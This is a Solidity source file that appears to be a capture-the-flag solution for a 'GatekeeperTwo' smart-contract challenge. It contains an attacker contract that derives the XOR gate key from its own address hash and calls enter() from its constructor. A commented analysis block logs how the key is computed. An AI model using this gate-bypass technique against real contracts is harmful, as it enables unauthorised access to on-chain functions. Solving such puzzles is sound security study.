// 1 - Deploy this contract - Metamask
// Check the entrant - await contract.entrant() - Chrome Console

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    IGatekeeperTwo public gatekeeperTwo;

    constructor(address challengeAddress) public {
        gatekeeperTwo = IGatekeeperTwo(challengeAddress);
        uint64 key = (uint64(0) - 1) ^
            uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        gatekeeperTwo.enter(bytes8(key));
    }
}

/* Analysis:

// SPDX-License-Identifier: MIT
import "hardhat/console.sol";

pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateThree(bytes8 _gateKey) {
    address stan = address(0xb77070bD599655570a2aE22d33c0Df76107A21AE);
    console.logBytes(abi.encodePacked(stan));
    console.logBytes32(keccak256(abi.encodePacked(stan)));
    console.logBytes8(bytes8(keccak256(abi.encodePacked(stan))));
    console.log(uint64(bytes8(keccak256(abi.encodePacked(stan)))));
    console.log(uint64(_gateKey));
    console.log(uint64(bytes8(keccak256(abi.encodePacked(stan)))) ^ uint64(_gateKey));
    console.log(uint64(0));
    console.log(uint64(0) - 1);
    console.log(uint64(bytes8(keccak256(abi.encodePacked(stan)))) ^ uint64(_gateKey) == uint64(0) - 1);
    console.log("Solution: ", uint64(bytes8(keccak256(abi.encodePacked(stan)))) ^ uint64(-1));
    require(uint64(bytes8(keccak256(abi.encodePacked(stan)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  // 0x1122334455667788
  function enter(bytes8 _gateKey) public gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
} */
